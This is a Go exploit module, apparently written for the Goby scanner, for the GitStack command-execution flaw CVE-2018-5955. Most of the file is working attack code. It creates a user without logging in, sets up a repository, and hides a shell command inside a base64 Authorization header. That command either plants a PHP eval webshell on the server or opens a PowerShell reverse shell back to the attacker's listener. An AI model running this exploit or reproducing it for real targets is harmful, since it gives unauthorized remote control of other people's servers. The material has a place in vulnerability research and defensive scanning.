package exploits

import (
		"encoding/base64"
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "GitStack Code Execution Vulnerability (CVE-2018-5955)",
    "Description": "<p>GitStack is a version control system based on Windows platform.</p><p>A command execution vulnerability in GitStack 2.3.10 and earlier is due to the program not sufficiently filtering user input. Attackers can execute commands through this vulnerability, causing serious harm.</p>",
    "Product": "GitStack-Code-MGMT",
    "Homepage": "https://gitstack.com/",
    "DisclosureDate": "2021-06-16",
    "PostTime": "2023-08-02",
    "Author": "mengzd@foxmail.com",
    "FofaQuery": "server=\"Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python\"||body=\"gitstack\"||cert=\"gitstack\"",
    "GobyQuery": "server=\"Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python\"||body=\"gitstack\"||cert=\"gitstack\"",
    "Level": "3",
    "Impact": "<p>Because user-controlled input is not sufficiently filtered, allowing an unauthenticated attacker to create a user without logging in.</p>",
    "Recommendation": "<p>1. Strictly filter the content entered by users.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_windows,get_webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "input",
            "value": "<?php eval($_POST['ant']); ?>",
            "show": "AttackType=get_webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2018-5955"
    ],
    "CNNVD": [
        "CNNVD-201801-810"
    ],
    "CNVD": [
        "CNVD-2018-04319 "
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "GitStack 代码执行漏洞（CVE-2018-5955）",
            "Product": "GitStack-代码管理",
            "Description": "<p>GitStack是一套基于Windows平台的版本控制系统。</p><p>GitStack 2.3.10及之前版本中存在命令执行漏洞，该漏洞源于程序没有充分的过滤用户的输入。攻击者可通过该漏洞执行命令，危害严重。</p>",
            "Recommendation": "<p>1、对用户输入的内容进行严格过滤。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>由于用户控制的输入没有被充分过滤，允许未经身份验证的攻击者可以在没有登录的情况下创建用户。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "GitStack Code Execution Vulnerability (CVE-2018-5955)",
            "Product": "GitStack-Code-MGMT",
            "Description": "<p>GitStack is a version control system based on Windows platform.</p><p>A command execution vulnerability in GitStack 2.3.10 and earlier is due to the program not sufficiently filtering user input. Attackers can execute commands through this vulnerability, causing serious harm.</p>",
            "Recommendation": "<p>1. Strictly filter the content entered by users.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Because user-controlled input is not sufficiently filtered, allowing an unauthenticated attacker to create a user without logging in.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10215"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
			s := make([]rune, 10)
			for i := range s {
				s[i] = letters[rand.Intn(len(letters))]
			}
			username := string(s)
			password := string(s)
			uri := "/rest/user/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf("username=%s&password=%s", username, password)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if (resp.StatusCode == 200 && strings.Contains(resp.RawBody, "User created")) || strings.Contains(resp.RawBody, "User already exist") {
					time.Sleep(time.Second * 1)
					uri = fmt.Sprintf("/rest/user/%s/", username)
					cfg := httpclient.NewRequestConfig("DELETE", uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					httpclient.DoHttpRequest(u, cfg)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/rest/settings/general/webinterface/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "{\"enabled\": false}") {
					cfg := httpclient.NewRequestConfig("PUT", "/rest/settings/general/webinterface/")
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.VerifyTls = false
					cfg.Data = "{\"enabled\": true}"
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if !(resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Web interface successfully enabled")) {
							return expResult
						}
					}
				}
			}
			var csrftoken []string
			cfg = httpclient.NewGetRequestConfig("/registration/login/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					csrftoken = regexp.MustCompile(`csrftoken=(.*?);`).FindStringSubmatch(resp.Cookie)
				}
			}
			var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
			s := make([]rune, 10)
			for i := range s {
				s[i] = letters[rand.Intn(len(letters))]
			}
			username := string(s)
			password := string(s)
			repoName := goutils.RandomHexString(6)
			var isCreatedUser = false
			cfg = httpclient.NewGetRequestConfig("/rest/user/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					var userList []string
					json.Unmarshal([]byte(resp.Utf8Html), &userList)
					if len(userList) <= 1 {
						cfg = httpclient.NewPostRequestConfig("/rest/user/")
						cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg.VerifyTls = false
						cfg.Data = fmt.Sprintf("username=%s&password=%s", username, password)
						if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
							if !((resp.StatusCode == 200 && strings.Contains(resp.RawBody, "User created")) || strings.Contains(resp.RawBody, "User already exist")) {
								return expResult
							}
							isCreatedUser = true
						}
					} else {
						username = userList[0]
					}
				}
			}
			cfg = httpclient.NewPostRequestConfig("/rest/repository/")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", fmt.Sprintf("csrftoken=%s", csrftoken[1]))
			cfg.Header.Store("Referer", fmt.Sprintf("%s/gitstack/", expResult.HostInfo))
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf("name=%s&csrfmiddlewaretoken=%s", repoName, csrftoken[1])
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if !(resp.StatusCode == 200 && strings.Contains(resp.RawBody, "successfully created")) {
					return expResult
				}
			}
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/rest/repository/%s/user/%s/", repoName, username))
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				result := fmt.Sprintf("User %s added to %s", username, repoName)
				if !(resp.StatusCode == 200 && strings.Contains(resp.RawBody, result)) {
					return expResult
				}
			}
			webshell := ss.Params["webshell"].(string)
			if ss.Params["AttackType"].(string) == "get_webshell" {
				filename := goutils.RandomHexString(6) + ".php"
				cmd := fmt.Sprintf(`echo "%s" > C:\GitStack\gitphp\%s`, webshell, filename)
				cfg = httpclient.NewGetRequestConfig(fmt.Sprintf("/web/index.php?p=%s.git&a=summary", repoName))
				cfg.VerifyTls = false
				authInfo := fmt.Sprintf("%s:a&&%s", username, cmd)
				b64AuthInfo := base64.StdEncoding.EncodeToString([]byte(authInfo))
				cfg.Header.Store("Authorization", "Basic "+b64AuthInfo)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 401 {
						cfg = httpclient.NewGetRequestConfig(fmt.Sprintf("/web/%s", filename))
						cfg.VerifyTls = false
						cfg.FollowRedirect = false
						if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
							if resp.StatusCode == 200 {
								expResult.Success = true
								expResult.Output = fmt.Sprintf("Webshell:%s/web/%s, pass:ant", expResult.HostInfo, filename)
							}
						}
					}
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_windows" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					cfg = httpclient.NewGetRequestConfig(fmt.Sprintf("/web/index.php?p=%s.git&a=summary", repoName))
					cfg.VerifyTls = false
					authInfo := fmt.Sprintf("%s:a&&%s", username, cmd)
					b64AuthInfo := base64.StdEncoding.EncodeToString([]byte(authInfo))
					cfg.Header.Store("Authorization", "Basic "+b64AuthInfo)
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 20):
					}
				}
			}
			cfg = httpclient.NewRequestConfig("DELETE", fmt.Sprintf("/rest/repository/%s/", repoName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if isCreatedUser {
				cfg = httpclient.NewRequestConfig("DELETE", fmt.Sprintf("/rest/user/%s/", username))
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			}
			return expResult
		},
	))
}